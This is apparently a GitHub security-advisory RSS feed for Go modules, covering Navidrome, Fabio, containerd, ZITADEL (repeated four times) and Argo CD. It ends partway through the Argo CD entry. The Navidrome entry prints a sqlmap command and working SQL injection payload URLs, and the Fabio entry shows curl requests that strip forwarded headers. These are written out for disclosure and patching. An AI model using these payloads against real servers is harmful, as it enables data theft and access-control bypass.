<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2025-05-29T20:33:13.066Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/navidrome/navidrome] Navidrome allows SQL Injection via role parameter]]></title>
        <id>https://github.com/advisories/GHSA-5wgp-vjxm-3x2r</id>
        <link href="https://github.com/advisories/GHSA-5wgp-vjxm-3x2r"/>
        <updated>2025-05-29T17:27:56.000Z</updated>
        <content type="html"><![CDATA[<h2 id="ðŸ›¡-security-advisory-sql-injection-vulnerability-in-navidrome-v0552">ðŸ›¡ <strong>Security Advisory: SQL Injection Vulnerability in Navidrome v0.55.2</strong></h2>
<h3 id="overview"><strong>Overview</strong></h3>
<p>This vulnerability arises due to improper input validation on the <strong><code>role</code></strong> parameter within the API endpoint <strong><code>/api/artist</code></strong>. Attackers can exploit this flaw to inject arbitrary SQL queries, potentially gaining unauthorized access to the backend database and compromising sensitive user information.</p>
<hr>
<h3 id="details"><strong>Details</strong></h3>
<ul>
<li><p><strong>Vulnerable Component</strong>:
API endpoint â†’ <code>/api/artist</code>
Parameter â†’ <code>role</code></p>
</li>
<li><p><strong>Vulnerability Type</strong>:
SQL Injection (stacked queries, UNION queries)</p>
</li>
<li><p><strong>Database Affected</strong>:
SQLite (confirmed exploitation via SQLite-specific payloads)</p>
</li>
<li><p><strong>Impact</strong>:
Successful exploitation allows an unauthenticated attacker to:</p>
<ul>
<li>Execute arbitrary SQL commands</li>
<li>Extract or manipulate sensitive data (e.g., user records, playlists)</li>
<li>Potentially escalate privileges or disrupt service availability</li>
</ul>
</li>
</ul>
<hr>
<h3 id="proof-of-concept-poc"><strong>Proof of Concept (PoC)</strong></h3>
<p><strong>Example Exploit Command</strong>:</p>
<pre><code class="language-bash">sqlmap.py -r navi --level 5 --risk 3 -a --banner --batch --tamper charencode --dbms sqlite
</code></pre>
<p><strong>Sample Payloads</strong>:</p>
<ul>
<li><p><strong>Stacked Queries</strong>:</p>
<pre><code>http://navidrome/api/artist?_end=15&amp;_order=ASC&amp;_sort=name&amp;_start=0&amp;role=albumartist');SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--
</code></pre>
</li>
<li><p><strong>UNION-Based Query</strong>:</p>
<pre><code>http://navidrome.local/api/artist?_end=15&amp;_order=ASC&amp;_sort=name&amp;_start=0&amp;role=albumartist') UNION ALL SELECT 92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,CHAR(113,98,118,98,113)||CHAR(113,84,86,119,114,71,106,104,90,118,120,104,79,66,104,108,121,106,70,68,90,113,104,117,67,98,113,67,103,84,71,120,119,119,117,121,81,76,100,71)||CHAR(113,120,112,106,113),92,92,92,92-- Mtny
</code></pre>
</li>
</ul>
<p><strong>Example HTTP Request</strong>:</p>
<pre><code class="language-http">GET /api/artist?_end=15&amp;_order=ASC&amp;_sort=name&amp;_start=0&amp;role=albumartist* HTTP/2
Host: &lt;TARGET HOST&gt;
Cookie: &lt;REPLACE WITH VALID COOKIE&gt;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: application/json
X-Nd-Authorization: &lt;REPLACE WITH AUTH TOKEN&gt;
X-Nd-Client-Unique-Id: &lt;REPLACE WITH CLIENT ID&gt;
</code></pre>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/navidrome/navidrome/security/advisories/GHSA-5wgp-vjxm-3x2r">https://github.com/navidrome/navidrome/security/advisories/GHSA-5wgp-vjxm-3x2r</a></li>
<li><a href="https://github.com/navidrome/navidrome/commit/b19d5f0d3e079639904cac95735228f445c798b6">https://github.com/navidrome/navidrome/commit/b19d5f0d3e079639904cac95735228f445c798b6</a></li>
<li><a href="https://github.com/advisories/GHSA-5wgp-vjxm-3x2r">https://github.com/advisories/GHSA-5wgp-vjxm-3x2r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5wgp-vjxm-3x2r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-29T17:27:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fabiolb/fabio] Fabio allows HTTP clients to manipulate custom headers it adds]]></title>
        <id>https://github.com/advisories/GHSA-q7p4-7xjv-j3wf</id>
        <link href="https://github.com/advisories/GHSA-q7p4-7xjv-j3wf"/>
        <updated>2025-05-29T16:51:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Fabio allows clients to remove X-Forwarded headers (except X-Forwarded-For) due to a vulnerability in how it processes hop-by-hop headers.</p>
<p>Fabio adds HTTP headers like X-Forwarded-Host and X-Forwarded-Port when routing requests to backend applications. Since the receiving application should trust these headers, allowing HTTP clients to remove or modify them creates potential security vulnerabilities.</p>
<p>However, it was found that some of these custom headers can indeed be removed and, in certain cases, manipulated. The attack relies on the behavior that headers can be defined as hop-by-hop via the HTTP Connection header. By setting the following connection header, the X-Forwarded-Host header can, for example, be removed:</p>
<pre><code>Connection: close, X-Forwarded-Host
</code></pre>
<p>Similar critical vulnerabilities have been identified in other web servers and proxies, including <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31813">CVE-2022-31813</a> in Apache HTTP Server and <a href="https://github.com/advisories/GHSA-62c8-mh53-4cqv">CVE-2024-45410</a> in Traefik.</p>
<h3 id="details">Details</h3>
<p>It was found that the following headers can be removed in this way (i.e. by specifying them within a connection header):</p>
<ul>
<li>X-Forwarded-Host</li>
<li>X-Forwarded-Port</li>
<li>X-Forwarded-Proto</li>
<li>X-Real-Ip</li>
<li>Forwarded</li>
</ul>
<h3 id="poc">PoC</h3>
<p>The following docker-compose file was used for testing:</p>
<pre><code class="language-yml">version: '3'
services:
  fabio:
    image: fabiolb/fabio
    ports:
      - "3000:9999"
      - "9998:9998"
    volumes:
      - ./fabio.properties:/etc/fabio/fabio.properties

  backend:
    build: .
    ports:
      - "8080:8080"
    environment:
      - PYTHONUNBUFFERED=1
</code></pre>
<p>The fabio.properties configuration:</p>
<pre><code>proxy.addr = :9999
ui.addr = :9998
registry.backend = static
registry.static.routes = route add service / http://backend:8080/
</code></pre>
<p>A Python container runs a simple HTTP server that logs received headers.
The Dockerfile:</p>
<pre><code class="language-dockerfile">FROM python:3.11-slim

WORKDIR /app

COPY app.py .

RUN pip install flask

EXPOSE 8080

CMD ["python", "app.py"]
</code></pre>
<p>Python Flask Server</p>
<pre><code class="language-python">from flask import Flask, request
import sys
import os

sys.stdout.flush()
sys.stderr.flush()
os.environ['PYTHONUNBUFFERED'] = '1'

app = Flask(__name__)

@app.before_request
def log_request_info():
    print("HEADERS:")
    for header_name, header_value in request.headers:
        print(f"   {header_name}: {header_value}")

@app.route("/", methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def hello():
    return f"Hello, World! Method: {request.method}"

@app.route("/&lt;path:path&gt;", methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def catch_all(path):
    return f"Caught path: {path}, Method: {request.method}"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
</code></pre>
<p>A normal HTTP request/response pair looks like this:</p>
<h4 id="request">Request</h4>
<pre><code class="language-http">GET / HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: curl/8.7.1
Accept: */*
Connection: keep-alive
</code></pre>
<p>curl command</p>
<pre><code class="language-bash">curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1:3000' -H $'User-Agent: curl/8.7.1' -H $'Accept: */*' -H $'Connection: keep-alive' \
    $'http://127.0.0.1:3000/'
</code></pre>
<h4 id="response">Response</h4>
<pre><code class="language-http">HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.11.12
Date: Thu, 22 May 2025 23:09:12 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 25
Connection: close

Hello, World! Method: GET
</code></pre>
<p>Server Log</p>
<pre><code>backend-1  | HEADERS:
backend-1  |    Host: 127.0.0.1:3000
backend-1  |    User-Agent: curl/8.7.1
backend-1  |    Accept: */*
backend-1  |    Forwarded: for=192.168.65.1; proto=http; by=172.24.0.3; httpproto=http/1.1
backend-1  |    X-Forwarded-For: 192.168.65.1
backend-1  |    X-Forwarded-Host: 127.0.0.1:3000
backend-1  |    X-Forwarded-Port: 3000
backend-1  |    X-Forwarded-Proto: http
backend-1  |    X-Real-Ip: 192.168.65.1
</code></pre>
<p>Next, a request, where the Forwarded header is defined as a hop-by-hop header via the Connection header is sent:</p>
<h4 id="request-1">Request</h4>
<pre><code class="language-http">GET / HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: curl/8.7.1
Accept: */*
yeet: 123
Connection: keep-alive, Forwarded
</code></pre>
<p>curl command</p>
<pre><code class="language-bash">curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 127.0.0.1:3000' -H $'User-Agent: curl/8.7.1' -H $'Accept: */*' -H $'Connection: keep-alive, Forwarded' \
    $'http://127.0.0.1:3000/'
</code></pre>
<h4 id="response-1">Response</h4>
<pre><code class="language-http">HTTP/1.1 200 OK
Content-Length: 25
Content-Type: text/html; charset=utf-8
Date: Thu, 22 May 2025 23:42:45 GMT
Server: Werkzeug/3.1.3 Python/3.11.12

Hello, World! Method: GET
</code></pre>
<p>Server Logs</p>
<pre><code>backend-1  | HEADERS:
backend-1  |    Host: 127.0.0.1:3000
backend-1  |    User-Agent: curl/8.7.1
backend-1  |    Accept: */*
backend-1  |    X-Forwarded-For: 192.168.65.1
backend-1  |    X-Forwarded-Host: 127.0.0.1:3000
backend-1  |    X-Forwarded-Port: 3000
backend-1  |    X-Forwarded-Proto: http
backend-1  |    X-Real-Ip: 192.168.65.1
</code></pre>
<p>The response shows that Fabio's <code>Forwarded</code> header was removed from the request</p>
<h3 id="impact">Impact</h3>
<p>If the backend application trusts these custom headers for security-sensitive operations, their removal or modification may lead to vulnerabilities such as access control bypass.</p>
<p>This vulnerability has a critical severity rating similar to  <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31813">CVE-2022-31813</a> (Apache HTTP Server, 9.8) and <a href="https://github.com/advisories/GHSA-62c8-mh53-4cqv">CVE-2024-45410</a> (Traefik, 9.3)</p>
<p>Stripping headers like <code>X-Real-IP</code> can confuse the upstream server about whether the request is coming from an external client through the reverse proxy or from an internal source. This type of vulnerability can be exploited as demonstrated in: <a href="https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce">Versa Concerto RCE</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/advisories/GHSA-62c8-mh53-4cqv">CVE-2024-45410</a> </li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-31813">CVE-2022-31813</a></li>
<li><a href="https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce">Versa Concerto RCE</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fabiolb/fabio/security/advisories/GHSA-q7p4-7xjv-j3wf">https://github.com/fabiolb/fabio/security/advisories/GHSA-q7p4-7xjv-j3wf</a></li>
<li><a href="https://github.com/fabiolb/fabio/commit/fdaf1e966162e9dd3b347ffdd0647b39dc71a1a3">https://github.com/fabiolb/fabio/commit/fdaf1e966162e9dd3b347ffdd0647b39dc71a1a3</a></li>
<li><a href="https://github.com/fabiolb/fabio/releases/tag/v1.6.6">https://github.com/fabiolb/fabio/releases/tag/v1.6.6</a></li>
<li><a href="https://github.com/advisories/GHSA-q7p4-7xjv-j3wf">https://github.com/advisories/GHSA-q7p4-7xjv-j3wf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q7p4-7xjv-j3wf</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-05-29T16:50:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containerd/containerd/v2] containerd allows host filesystem access on pull]]></title>
        <id>https://github.com/advisories/GHSA-cm76-qm8v-3j95</id>
        <link href="https://github.com/advisories/GHSA-cm76-qm8v-3j95"/>
        <updated>2025-05-28T19:44:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A time-of-check to time-of-use (TOCTOU) vulnerability was found in containerd v2.1.0. While unpacking an image during an image pull, specially crafted container images could arbitrarily modify the host file system. </p>
<h3 id="patches">Patches</h3>
<p>This bug has been fixed in the following containerd versions:</p>
<ul>
<li>2.1.1</li>
</ul>
<p>The only affected version of containerd is 2.1.0.  Other versions of containerd are not affected.</p>
<p>Users should update to this version to resolve the issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure that only trusted images are used and that only trusted users have permissions to import images.</p>
<h3 id="credits">Credits</h3>
<p>The containerd project would like to thank TÃµnis Tiigi for responsibly disclosing this issue in accordance with the <a href="https://github.com/containerd/project/blob/main/SECURITY.md">containerd security policy</a>.</p>
<h3 id="references">References</h3>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47290">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47290</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/containerd/containerd/issues/new/choose">containerd</a></li>
<li>Email us at <a href="mailto:security@containerd.io">security@containerd.io</a></li>
</ul>
<p>To report a security issue in containerd:</p>
<ul>
<li><a href="https://github.com/containerd/containerd/security/advisories/new">Report a new vulnerability</a></li>
<li>Email us at <a href="mailto:security@containerd.io">security@containerd.io</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containerd/containerd/security/advisories/GHSA-cm76-qm8v-3j95">https://github.com/containerd/containerd/security/advisories/GHSA-cm76-qm8v-3j95</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47290">https://nvd.nist.gov/vuln/detail/CVE-2025-47290</a></li>
<li><a href="https://github.com/containerd/containerd/commit/cada13298fba85493badb6fecb6ccf80e49673cc">https://github.com/containerd/containerd/commit/cada13298fba85493badb6fecb6ccf80e49673cc</a></li>
<li><a href="https://github.com/containerd/containerd/releases/tag/v2.1.1">https://github.com/containerd/containerd/releases/tag/v2.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-cm76-qm8v-3j95">https://github.com/advisories/GHSA-cm76-qm8v-3j95</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cm76-qm8v-3j95</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-21T16:53:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel/v2] ZITADEL Allows Account Takeover via Malicious X-Forwarded-Proto Header Injection]]></title>
        <id>https://github.com/advisories/GHSA-93m4-mfpg-c3xf</id>
        <link href="https://github.com/advisories/GHSA-93m4-mfpg-c3xf"/>
        <updated>2025-05-29T05:48:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A potential vulnerability exists in ZITADEL's password reset mechanism. ZITADEL utilizes the Forwarded or X-Forwarded-Host header from incoming requests to construct the URL for the password reset confirmation link. This link, containing a secret code, is then emailed to the user.</p>
<p>If an attacker can manipulate these headers (e.g., via host header injection), they could cause ZITADEL to generate a password reset link pointing to a malicious domain controlled by the attacker. If the user clicks this manipulated link in the email, the secret reset code embedded in the URL can be captured by the attacker. This captured code could then be used to reset the user's password and gain unauthorized access to their account.</p>
<p>It's important to note that this specific attack vector is mitigated for accounts that have Multi-Factor Authentication (MFA) or Passwordless authentication enabled.</p>
<h3 id="patches">Patches</h3>
<p>Patched version ensure proper validation of the headers and do not allow downgrading from https to http.</p>
<p>3.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.2.2">3.2.2</a>
2.71.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v2.71.11">2.71.11</a>
2.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v2.70.12">2.70.12</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>The recommended solution is to update ZITADEL to a patched version.</p>
<p>A ZITADEL fronting proxy can be configured to delete all Forwarded and X-Forwarded-Host header values before sending requests to ZITADEL self-hosted environments.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Amit Laish â€“ GE Vernova for finding and reporting the vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf">https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53">https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53</a></li>
<li><a href="https://github.com/advisories/GHSA-93m4-mfpg-c3xf">https://github.com/advisories/GHSA-93m4-mfpg-c3xf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-93m4-mfpg-c3xf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-28T17:36:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel/v2] ZITADEL Allows Account Takeover via Malicious X-Forwarded-Proto Header Injection]]></title>
        <id>https://github.com/advisories/GHSA-93m4-mfpg-c3xf</id>
        <link href="https://github.com/advisories/GHSA-93m4-mfpg-c3xf"/>
        <updated>2025-05-29T05:48:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A potential vulnerability exists in ZITADEL's password reset mechanism. ZITADEL utilizes the Forwarded or X-Forwarded-Host header from incoming requests to construct the URL for the password reset confirmation link. This link, containing a secret code, is then emailed to the user.</p>
<p>If an attacker can manipulate these headers (e.g., via host header injection), they could cause ZITADEL to generate a password reset link pointing to a malicious domain controlled by the attacker. If the user clicks this manipulated link in the email, the secret reset code embedded in the URL can be captured by the attacker. This captured code could then be used to reset the user's password and gain unauthorized access to their account.</p>
<p>It's important to note that this specific attack vector is mitigated for accounts that have Multi-Factor Authentication (MFA) or Passwordless authentication enabled.</p>
<h3 id="patches">Patches</h3>
<p>Patched version ensure proper validation of the headers and do not allow downgrading from https to http.</p>
<p>3.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.2.2">3.2.2</a>
2.71.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v2.71.11">2.71.11</a>
2.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v2.70.12">2.70.12</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>The recommended solution is to update ZITADEL to a patched version.</p>
<p>A ZITADEL fronting proxy can be configured to delete all Forwarded and X-Forwarded-Host header values before sending requests to ZITADEL self-hosted environments.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Amit Laish â€“ GE Vernova for finding and reporting the vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf">https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53">https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53</a></li>
<li><a href="https://github.com/advisories/GHSA-93m4-mfpg-c3xf">https://github.com/advisories/GHSA-93m4-mfpg-c3xf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-93m4-mfpg-c3xf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-28T17:36:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel/v2] ZITADEL Allows Account Takeover via Malicious X-Forwarded-Proto Header Injection]]></title>
        <id>https://github.com/advisories/GHSA-93m4-mfpg-c3xf</id>
        <link href="https://github.com/advisories/GHSA-93m4-mfpg-c3xf"/>
        <updated>2025-05-29T05:48:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A potential vulnerability exists in ZITADEL's password reset mechanism. ZITADEL utilizes the Forwarded or X-Forwarded-Host header from incoming requests to construct the URL for the password reset confirmation link. This link, containing a secret code, is then emailed to the user.</p>
<p>If an attacker can manipulate these headers (e.g., via host header injection), they could cause ZITADEL to generate a password reset link pointing to a malicious domain controlled by the attacker. If the user clicks this manipulated link in the email, the secret reset code embedded in the URL can be captured by the attacker. This captured code could then be used to reset the user's password and gain unauthorized access to their account.</p>
<p>It's important to note that this specific attack vector is mitigated for accounts that have Multi-Factor Authentication (MFA) or Passwordless authentication enabled.</p>
<h3 id="patches">Patches</h3>
<p>Patched version ensure proper validation of the headers and do not allow downgrading from https to http.</p>
<p>3.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.2.2">3.2.2</a>
2.71.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v2.71.11">2.71.11</a>
2.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v2.70.12">2.70.12</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>The recommended solution is to update ZITADEL to a patched version.</p>
<p>A ZITADEL fronting proxy can be configured to delete all Forwarded and X-Forwarded-Host header values before sending requests to ZITADEL self-hosted environments.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Amit Laish â€“ GE Vernova for finding and reporting the vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf">https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53">https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53</a></li>
<li><a href="https://github.com/advisories/GHSA-93m4-mfpg-c3xf">https://github.com/advisories/GHSA-93m4-mfpg-c3xf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-93m4-mfpg-c3xf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-28T17:36:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel/v2] ZITADEL Allows Account Takeover via Malicious X-Forwarded-Proto Header Injection]]></title>
        <id>https://github.com/advisories/GHSA-93m4-mfpg-c3xf</id>
        <link href="https://github.com/advisories/GHSA-93m4-mfpg-c3xf"/>
        <updated>2025-05-29T05:48:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A potential vulnerability exists in ZITADEL's password reset mechanism. ZITADEL utilizes the Forwarded or X-Forwarded-Host header from incoming requests to construct the URL for the password reset confirmation link. This link, containing a secret code, is then emailed to the user.</p>
<p>If an attacker can manipulate these headers (e.g., via host header injection), they could cause ZITADEL to generate a password reset link pointing to a malicious domain controlled by the attacker. If the user clicks this manipulated link in the email, the secret reset code embedded in the URL can be captured by the attacker. This captured code could then be used to reset the user's password and gain unauthorized access to their account.</p>
<p>It's important to note that this specific attack vector is mitigated for accounts that have Multi-Factor Authentication (MFA) or Passwordless authentication enabled.</p>
<h3 id="patches">Patches</h3>
<p>Patched version ensure proper validation of the headers and do not allow downgrading from https to http.</p>
<p>3.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.2.2">3.2.2</a>
2.71.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v2.71.11">2.71.11</a>
2.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v2.70.12">2.70.12</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>The recommended solution is to update ZITADEL to a patched version.</p>
<p>A ZITADEL fronting proxy can be configured to delete all Forwarded and X-Forwarded-Host header values before sending requests to ZITADEL self-hosted environments.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Amit Laish â€“ GE Vernova for finding and reporting the vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf">https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53">https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53</a></li>
<li><a href="https://github.com/advisories/GHSA-93m4-mfpg-c3xf">https://github.com/advisories/GHSA-93m4-mfpg-c3xf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-93m4-mfpg-c3xf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-28T17:36:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL Allows Account Takeover via Malicious X-Forwarded-Proto Header Injection]]></title>
        <id>https://github.com/advisories/GHSA-93m4-mfpg-c3xf</id>
        <link href="https://github.com/advisories/GHSA-93m4-mfpg-c3xf"/>
        <updated>2025-05-29T05:48:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A potential vulnerability exists in ZITADEL's password reset mechanism. ZITADEL utilizes the Forwarded or X-Forwarded-Host header from incoming requests to construct the URL for the password reset confirmation link. This link, containing a secret code, is then emailed to the user.</p>
<p>If an attacker can manipulate these headers (e.g., via host header injection), they could cause ZITADEL to generate a password reset link pointing to a malicious domain controlled by the attacker. If the user clicks this manipulated link in the email, the secret reset code embedded in the URL can be captured by the attacker. This captured code could then be used to reset the user's password and gain unauthorized access to their account.</p>
<p>It's important to note that this specific attack vector is mitigated for accounts that have Multi-Factor Authentication (MFA) or Passwordless authentication enabled.</p>
<h3 id="patches">Patches</h3>
<p>Patched version ensure proper validation of the headers and do not allow downgrading from https to http.</p>
<p>3.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.2.2">3.2.2</a>
2.71.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v2.71.11">2.71.11</a>
2.x versions are fixed on &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v2.70.12">2.70.12</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>The recommended solution is to update ZITADEL to a patched version.</p>
<p>A ZITADEL fronting proxy can be configured to delete all Forwarded and X-Forwarded-Host header values before sending requests to ZITADEL self-hosted environments.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Amit Laish â€“ GE Vernova for finding and reporting the vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf">https://github.com/zitadel/zitadel/security/advisories/GHSA-93m4-mfpg-c3xf</a></li>
<li><a href="https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53">https://github.com/zitadel/zitadel/commit/c097887bc5f680e12c998580fb56d98a15758f53</a></li>
<li><a href="https://github.com/advisories/GHSA-93m4-mfpg-c3xf">https://github.com/advisories/GHSA-93m4-mfpg-c3xf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-93m4-mfpg-c3xf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-05-28T17:36:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v3] Argo CD allows cross-site scripting on repositories page]]></title>
        <id>https://github.com/advisories/GHSA-2hj5-g64g-fp6p</id>
        <link href="https://github.com/advisories/GHSA-2hj5-g64g-fp6p"/>
        <updated>2025-05-28T17:36:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to perform arbitrary actions on behalf of the victim via the API, such as creating, modifying, and deleting Kubernetes resources. Due to the improper filtering of URL protocols in the repository page, an attacker can achieve cross-site scripting with permission to edit the repository.</p>
